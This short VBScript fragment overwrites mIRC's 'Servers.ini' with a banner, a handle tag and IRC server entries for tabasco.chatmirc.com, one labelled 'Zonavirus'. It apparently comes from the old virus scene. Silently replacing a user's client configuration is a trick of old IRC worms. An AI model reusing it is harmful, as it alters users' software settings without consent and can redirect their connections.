Dim fso, f 
Set fso = CreateObject("Scripting.FileSystemObject") 
Set f = fso.OpenTextFile("Servers.ini",2, True) 
f.Writeline ";EL MEJOR SERVIDOR DEL MUNDO" 
f.Writeline ";[KUASANAGUI]" 
f.Writeline "[Servers]" 
f.Writeline "n0=ChatMirc TabascoSERVER:tabasco.chatmirc.com:6667GROUP:Coatza" 
f.Writeline "n1=ZonavirusSERVER:tabasco.chatmirc.com:6667GROUP:Zonavirus" 
f.Writeline "n2=ChatMirc CoatzaSERVER:tabasco.chatmirc.com:6667GROUP:Tabasco" 
